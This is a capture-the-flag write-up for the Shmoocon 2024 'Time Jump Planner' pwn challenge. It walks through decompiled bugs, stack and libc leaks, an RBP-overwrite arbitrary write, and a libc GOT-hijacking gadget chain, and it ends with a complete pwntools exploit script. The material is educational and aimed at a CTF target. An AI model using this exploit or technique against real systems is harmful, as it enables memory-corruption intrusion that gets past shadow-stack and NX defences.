Time Jump Planner was a pwn challenge written by [playoff-rondo](https://ctftime.org/user/3509) for Battelle's Shmoocon CTF.  I solved first :)

tl;dr
- x64 running insides QEMU
- PIE, ASLR, Full RELRO, NX
- QEMU plugin enforced execve filter and shadow stack + win syscall (need to control first two arguments)
- PIE/libc/stack leaks, sprintf buffer overflow
- used [GOT Oriented Programming](https://github.com/n132/Libc-GOT-Hijacking/blob/main/Post/README.md)

## bug review and building primitives

```c
00001875  int32_t main(int32_t argc, char** argv, char** envp)

00001875  {
0000188a      void* fsbase;
0000188a      int64_t var_10 = *(uint64_t*)((char*)fsbase + 0x28);
00001890      int32_t year = 0x7e7;
000018a8      void dial;
000018a8      memset(&dial, 0, 0x28);
000018b4      setup(&dial);
000018c3      puts("Time Jump Planner v1.2");
000018d5      while (true)
000018d5      {
000018de          switch (((int32_t)menu(year)))
000018c8          {
000018fe              case 0:
000018fe              {
000018fe                  continue;
000018fe              }
00001908              case 1:
00001908              {
00001908                  add(&dial);
0000190d                  continue;
0000190d              }
00001916              case 2:
00001916              {
00001916                  remove_year(&dial);
0000191b                  continue;
0000191b              }
0000192b              case 3:
0000192b              {
0000192b                  quick_jump(&dial, &year);
00001930                  continue;
00001930              }
00001939              case 4:
00001939              {
00001939                  manual_jump(&year);
0000193e                  continue;
0000193e              }
00001947              case 5:
00001947              {
00001947                  list(&dial);
0000194c                  continue;
0000194c              }
000018fe              case 6:
000018fe              {
000018fe                  break;
000018fe                  break;
000018fe              }
000018fe          }
000018fe      }
00001958      puts("Good Bye");
00001962      exit(0);
00001962      /* no return */
00001962  }
```

```c
0000169b  int64_t manual_jump(int32_t* arg1)

0000169b  {
000016ab      void* fsbase;
000016ab      int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
000016ba      int32_t var_48 = 1;
000016cb      puts("Manual Jump Mode:");
000016df      printf("Enter Year: ");
000016fa      int32_t var_4c;
000016fa      __isoc99_scanf("%d%*c", &var_4c);
00001709      puts("Describe location:");
0000171d      printf("\tEnter number of characters of …");
00001738      __isoc99_scanf("%d%*c", &var_48);
00001743      if (var_48 > 0x1e)
00001740      {
00001745          var_48 = 0x1e;
00001745      }
00001765      void var_42;
00001765      sprintf(&var_42, "%%%ds", ((uint64_t)var_48), "%%%ds");
00001779      printf("\tEnter location: ");
00001791      void var_38;
00001791      __isoc99_scanf(&var_42, &var_38, &var_38);
000017ae      printf("Jumping to Year %u at %s\n", ((uint64_t)var_4c), &var_38);
000017ba      *(uint32_t*)arg1 = var_4c;
000017bc      getchar();
000017cf      if (rax == *(uint64_t*)((char*)fsbase + 0x28))
000017c6      {
000017d7          return (rax - *(uint64_t*)((char*)fsbase + 0x28));
000017c6      }
000017d1      __stack_chk_fail();
000017d1      /* no return */
000017d1  }
```

```c
000015ae  int64_t quick_jump(int64_t* arg1, int32_t* arg2)

000015ae  {
000015c2      void* fsbase;
000015c2      int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
000015db      puts("Quick Jump:");
000015ef      printf("Index: ");
0000160a      int32_t var_14;
0000160a      __isoc99_scanf("%d%*c", &var_14);
0000161c      if ((var_14 <= 0xa && var_14 >= 0))
0000161a      {
00001660          printf("Jumping to Year %lu at current l…", arg1[((int64_t)var_14)]);
00001682          *(uint32_t*)arg2 = ((int32_t)arg1[((int64_t)var_14)]);
00001692          if (rax == *(uint64_t*)((char*)fsbase + 0x28))
00001689          {
0000169a              return (rax - *(uint64_t*)((char*)fsbase + 0x28));
00001689          }
00001694          __stack_chk_fail();
00001694          /* no return */
00001694      }
00001628      puts("Invalid Index!");
00001632      exit(0);
00001632      /* no return */
00001632  }
```



There are a few different bugs around but I took advantage of two in my exploit.  A sprintf buffer overflow found in manual_jump and a minor out of bounds read present in quick_jump. 


The buffer overread is present in most operations on the dial array. It is a bounds-checked buffer of 10 u32 numbers, however when indexed it is treated as an array of u64. The functions add, remove_year, and list all have this bug but it's not particularly useful because things are otherwise interpreted as u32 (we can leak or set the lower four bytes for a bit of the stack frame, but the shadow stack means we can't do anything interesting with the return pointer).  There is one (that I found) useful leak with this bug -- quick_jump will copy a year from the dial table to the year variable and print it as a u64. 

```python
def quick_jump_leak(r, index):
    r.sendline(b"3")
    r.sendline(str(index))
    r.recvuntil(b" Year ")
    leak = int(r.recvuntil(b" "))
    r.recvuntil(b">>")
    return leak
```

The second major bug was present in manual_jump. A user provided length was used for scanf %s width and the bounds checking was insufficient. The width was limited to a maximum of 0x1e but there were no limits on the lower bound allowing for 0 or negative %s widths.  There are two ways to take advantage of this (that i'm aware of) -- a width of 0 (%0s) is equivalent to %s (causing a stack buffer overflow) and a width of -1 (%-1s) will not read bytes or place a terminating null byte. 

I used %-1s to leak a stack pointer from the now uninitialized buffer like so:

```python
r.sendline(b"4")
r.sendline(b"1337")
r.sendline(b"-1")
r.sendline(b"A5")
r.recvuntil(b"Year 1337 at ")
manual_jump_rbp = u64(r.recvline().rstrip().ljust(8,b'\x00')) - 0x118
r.recvuntil(b">>")
r.recvuntil(b">>")
```

I used %0s to build a write primitive. Due to the shadow stack I was unable to ROP and achieving code execution was nontrivial. With our previous leaks we can overflow past the saved RIP and canary -- and then modify the saved RBP. Once we return to the caller function local variables are referenced relative to RBP -- and we can easily build an arbitrary write primitive in many different ways.  I chose to use manual_jump so that after the write I could use the buffer overflow to repair RBP to the original value. 

```python
    def manual_jump_rbp_overwrite(r, year, target, should_fault=False):
        encoded_rbp = p64(target + 0x34)
        if b'\x0c' in encoded_rbp or b'\x20' in encoded_rbp or b'':
            print("cant do whitespace :(")
            exit(1)
        r.sendline(b"4")
        r.sendline(str(year))
        r.sendline(b"0")
        r.sendline(flat({
            16: 0x5add011,
            24: manual_jump_rbp+0x48,
            40: 0x41414141 if should_fault else canary,
            48: target + 0x34,
            56: pie_base+0x193e,
            80: 0x6942069420-1,
            200: "please_give_me_flag\x00",
        },length=256))
        try:
            r.recvuntil(b">>")
        except: # recvuntil will eof after it has crashed
            pass

    def write_u32(r, address, value, should_fault=False):
        log.info(f"writing u32 {hex(value)} to {hex(address)}")
        manual_jump_rbp_overwrite(r, 0, address)
        manual_jump_rbp_overwrite(r, value & 0xffffffff, manual_jump_rbp, should_fault=should_fault)
```

## arbitrary write... now what?

At this point we have the following capabilities:

- leak of a .text pointer, a libc pointer, and a stack pointer
- arbitrary write of a u32
- although I did not need it, the list function can be used for an arbitrary u32

In most cases the challenge would be essentially over -- arbitrary write is a powerful primitive, right?  Just drop a one gadget over function pointers until something matches the constraints?  In this case we're still at the beginning of the challenge.  As mentioned earlier, the binary is running inside QEMU with a plugin that does three things:

- implement a shadow stack
- block execve
- add a backdoor syscall to print the flag

To get the flag we need to be able to make a syscall with control of the first two arguments -- controlling rax, rdi, and rsi (or use the libc syscall function and control rdi, rsi, and rdx).  However, the tools to do that are extremely scarce.  I was stuck here for a long time with many failed approaches. After many failed approaches I came across a writeup on [libc GOT hijacking](https://github.com/n132/Libc-GOT-Hijacking/blob/main/Post/README.md).  I'm familiar with the use of the libc GOT as a replacement for free_hook/malloc_hook to call a controlled function but I'd never considered using it for a code reuse attack. 

The technique is roughly similar to GOP/JOP except it uses calls into the GOT as the method of directing control flow. 

```
> cargo run -- ~/chrononaut-shmoo-24/time_jump/jump_planner_release/libc.so.6 | wc -l
34704
```

For example, this is the first gadget of my chain which I used to shift the stack upwards to the controlled area: 

```
000d059b  4881c4f8000000     add     rsp, 0xf8
000d05a2  5b                 pop     rbx {__saved_rbx}
000d05a3  5d                 pop     rbp {__saved_rbp}
000d05a4  415c               pop     r12 {__saved_r12}
000d05a6  415d               pop     r13 {__saved_r13}
000d05a8  415e               pop     r14 {__saved_r14}
000d05aa  415f               pop     r15 {__saved_r15}
000d05ac  e90f80f5ff         jmp     jumps_wcscmp
```


The address of the next gadget would be placed in the GOT entry for wcscmp, which would end in a call to another GOT entry and so on.  

This technique has a rather significant fundamental limitation in that each GOT entry can only be used once or you'll create a cycle -- but in practice I found that wasn't a huge issue and it was relatively straightforward to control the first three arguments (at which point you could instead call mprotect and run shellcode).  The larger limitation is that you can't clobber a GOT entry if your write primitive calls it or you'll trigger your chain early and likely crash. I did this manually as I was writing my chain but it should be easy enough to automate in GDB (drop a tracepoint on each plt stub and check hitcounts?  The GDB plugin API should be sufficient... I'll probably write something up when I have time) and exclude those gadgets. 

## Building the chain

As mentioned earlier, my first gadget was intended to shift the stack to the controlled area.  Although some registers were set, the data on stack was uncontrolled.  Coincidentally, this gadget left rsp pointing directly to the start of the controlled stack data.  

```
000d059b  4881c4f8000000     add     rsp, 0xf8
000d05a2  5b                 pop     rbx {__saved_rbx}
000d05a3  5d                 pop     rbp {__saved_rbp}
000d05a4  415c               pop     r12 {__saved_r12}
000d05a6  415d               pop     r13 {__saved_r13}
000d05a8  415e               pop     r14 {__saved_r14}
000d05aa  415f               pop     r15 {__saved_r15}
000d05ac  e90f80f5ff         jmp     jumps_wcscmp
```

My second gadget was intended to populate rdx with 0x6942069420 -- the magic value for the second argument to the backdoor function. My stack control used sprintf which limited the bytes which could be written to non-whitespace bytes. I used this gadget which read data from the stack and then added 1 to rdx. 

```
0005139f  488b542450         mov     rdx, qword [rsp+0x50 {var_878_1}]
000513a4  4b8d3c08           lea     rdi, [r8+r9]
000513a8  4c89fe             mov     rsi, r15
000513ab  48894c2440         mov     qword [rsp+0x40 {var_888_4}], rcx
000513b0  4c894c2420         mov     qword [rsp+0x20 {var_8a8_6}], r9
000513b5  4883c201           add     rdx, 0x1
000513b9  4c89442428         mov     qword [rsp+0x28 {var_8a0_6}], r8
000513be  e86d70fdff         call    jumps_memmove
```

The next gadget popped from the stack into a variety of registers -- although none of these registers are directly used in the backdoor call I found a couple gadgets which moved from r registers.  

```
0013076c  5b                 pop     rbx {__saved_rbx}
0013076d  5d                 pop     rbp {__saved_rbp}
0013076e  415c               pop     r12 {__saved_r12}
00130770  415d               pop     r13 {__saved_r13}
00130772  415e               pop     r14 {__saved_r14}
00130774  e9077eefff         jmp     jumps___strcasecmp
```

The last two gadgets are fairly straightforward and just move from r13/r14 into rdi/rsi -- at which pointer we have set up registers appropriately and can call syscall. 

```
000c651c  4c89f6             mov     rsi, r14
000c651f  4889d7             mov     rdi, rdx
000c6522  4d01e6             add     r14, r12
000c6525  48891424           mov     qword [rsp {var_1a8}], rdx
000c6529  e85221f6ff         call    jumps_wcsnlen
    
0011de45  4c89ef             mov     rdi, r13
0011de48  41bc01000000       mov     r12d, 0x1
0011de4e  e89da7f0ff         call    jumps_rindex    
```

I used __stack_chk_fail to trigger my GOP chain because it is a relatively simple function with a slim stack frame which made it easier to access the controlled section of the stack from the gadgets. On the last write when the start of the chain was written I intentionally corrupted the canary to start the chain with a shorter stack frame. 


## notes, thoughts, other approaches

It's worth noting that this type of attack isn't limited to just libc -- it can be applied to any ELF with a writeable (non full RELRO) GOT (although in practice libc is big and consistently available).  If a more complex chain were needed and more libraries were available then a chain could be built across multiple library GOT sections. 

```
cargo run -- ~/chrononaut-shmoo-24/time_jump/jump_planner_release/ld-linux-x86-64.so.2 | wc -l 
1395
```

I had a lot of trouble with whitespace management.  The [author writeup](https://debugmen.dev/pwn/2024/01/15/jump-planner.html) used a double call gadget to call gets at the start -- leaving a much more manageable constraint (no newlines)

```
001187f2  e839fcf0ff         call    jump_memmove
001187f7  be2f000000         mov     esi, 0x2f
001187fc  4c89ef             mov     rdi, r13
001187ff  e8ecfdf0ff         call    jump_strrchr
```

Although during the event I found gadgets using a binary ninja script -- after the fact I wrote [a gadget finder](https://github.com/tsheinen/gopper/) which has no proprietary dependencies and can find gadgets including partial instructions.  I make no promises about code quality, general maintained-ness, or really anything -- i just thought it would be cool and slammed it together but im super busy :(

This was a challenge from the Battelle booth at Shmoocon 2024 -- I like [their recruiting CTF challenges](https://heinen.dev/battelle-winter-2022/holy-grail-of-rop/) and generally learn something cool when solving them.  Also they gave out a really cool badge. If you're interested you can find their cybersecurity careers page [here](https://solvers.battelle.org/cyber-challenge).  This is a no bias shill :) I do not work there. 

![a blue badge with LEDs which says Ohio Chrononaut Institute](/battelle-shmoocon-2024/battelle_shmoocon_badge.jpg)


## final script

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./jump_planner_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.terminal = ["zellij", "action", "new-pane", "-d", "right", "-c", "--", "zsh", "-c"]
context.binary = exe
context.bits = 64

def conn():
    if args.LOCAL:
        r = process(['./run'])
    elif args.GDB:
        r = gdb.debug([exe.path], gdbscript="")
    else:
        r = remote("jump.chrononaut.xyz", 5000)

    return r


def quick_jump_leak(r, index):
    r.sendline(b"3")
    r.sendline(str(index))
    r.recvuntil(b" Year ")
    leak = int(r.recvuntil(b" "))
    r.recvuntil(b">>")
    return leak

def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

def main():
    r = conn()

    R_DEBUG_OFFSET = 0x3b118

    pie_base  = quick_jump_leak(r, 9) - exe.symbols['main']
    libc.address  = quick_jump_leak(r, 7) - 0x29d90
    ld_address = libc.address + 0x29a000
    canary = quick_jump_leak(r,5)

    r.sendline(b"4")
    r.sendline(b"1337")
    r.sendline(b"-1")
    r.sendline(b"A5")
    r.recvuntil(b"Year 1337 at ")
    manual_jump_rbp = u64(r.recvline().rstrip().ljust(8,b'\x00')) - 0x118
    r.recvuntil(b">>")
    r.recvuntil(b">>")

    log.info(f"manual_jump_rbp @ {hex(manual_jump_rbp)}")
    log.info(f"pie_base @ {hex(pie_base)}")
    log.info(f"libc.address @ {hex(libc.address)}")
    log.info(f"canary @ {hex(canary)}")

    
    def manual_jump_rbp_overwrite(r, year, target, should_fault=False):
        encoded_rbp = p64(target + 0x34)
        if b'\x0c' in encoded_rbp or b'\x20' in encoded_rbp or b'':
            print("cant do whitespace :(")
            exit(1)
        r.sendline(b"4")
        r.sendline(str(year))
        r.sendline(b"0")
        r.sendline(flat({
            16: 0x5add011,
            24: manual_jump_rbp+0x48,
            40: 0x41414141 if should_fault else canary,
            48: target + 0x34,
            56: pie_base+0x193e,
            80: 0x6942069420-1,
            200: "please_give_me_flag\x00",
        },length=256))
        try:
            r.recvuntil(b">>")
        except: # recvuntil will eof after it has crashed
            pass

    def write_u32(r, address, value, should_fault=False):
        log.info(f"writing u32 {hex(value)} to {hex(address)}")
        manual_jump_rbp_overwrite(r, 0, address)
        manual_jump_rbp_overwrite(r, value & 0xffffffff, manual_jump_rbp, should_fault=should_fault)

    ADJUST_STACK = 0x000d059b # jumps to wcscmp
    # 000d059b  4881c4f8000000     add     rsp, 0xf8
    # 000d05a2  5b                 pop     rbx {__saved_rbx}
    # 000d05a3  5d                 pop     rbp {__saved_rbp}
    # 000d05a4  415c               pop     r12 {__saved_r12}
    # 000d05a6  415d               pop     r13 {__saved_r13}
    # 000d05a8  415e               pop     r14 {__saved_r14}
    # 000d05aa  415f               pop     r15 {__saved_r15}
    # 000d05ac  e90f80f5ff         jmp     jumps_wcscmp

    RDX_GADGET = libc.address + 0x0005139f
    # is a little screwy bc the needed rdx is 0x6942069420 which contains whitespace
    # 0005139f  488b542450         mov     rdx, qword [rsp+0x50 {var_878_1}]
    # 000513a4  4b8d3c08           lea     rdi, [r8+r9]
    # 000513a8  4c89fe             mov     rsi, r15
    # 000513ab  48894c2440         mov     qword [rsp+0x40 {var_888_4}], rcx
    # 000513b0  4c894c2420         mov     qword [rsp+0x20 {var_8a8_6}], r9
    # 000513b5  4883c201           add     rdx, 0x1
    # 000513b9  4c89442428         mov     qword [rsp+0x28 {var_8a0_6}], r8
    # 000513be  e86d70fdff         call    jumps_memmove

    BIG_POP_GADGET = libc.address + 0x0013076c # jumps to strcasecmp
    # 0013076c  5b                 pop     rbx {__saved_rbx}
    # 0013076d  5d                 pop     rbp {__saved_rbp}
    # 0013076e  415c               pop     r12 {__saved_r12}
    # 00130770  415d               pop     r13 {__saved_r13}
    # 00130772  415e               pop     r14 {__saved_r14}
    # 00130774  e9077eefff         jmp     jumps___strcasecmp

    MOV_RSI_R14 = libc.address + 0x000c651c
    # 000c651c  4c89f6             mov     rsi, r14
    # 000c651f  4889d7             mov     rdi, rdx
    # 000c6522  4d01e6             add     r14, r12
    # 000c6525  48891424           mov     qword [rsp {var_1a8}], rdx
    # 000c6529  e85221f6ff         call    jumps_wcsnlen

    MOV_RDI_R13 = libc.address + 0x0011de45 # calls rindex
    # 0011de45  4c89ef             mov     rdi, r13
    # 0011de48  41bc01000000       mov     r12d, 0x1
    # 0011de4e  e89da7f0ff         call    jumps_rindex    


    write_u32(r, libc.address + 0x219148, libc.symbols['syscall']) # rindex
    write_u32(r, libc.address + 0x219190, MOV_RDI_R13) #wcsnlen
    write_u32(r, libc.address + 0x219110-1, ( MOV_RSI_R14 & 0xffffffff) << 8) # strcasecmp
    # have to offset this by one bc the address contains whitespace
    write_u32(r, libc.address + 0x219068, BIG_POP_GADGET)  # memmove
    write_u32(r, libc.address + 0x219130,  RDX_GADGET) # wcscmp
    write_u32(r, libc.address + 0x219098, libc.address + ADJUST_STACK, should_fault=True)#) # strlen

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```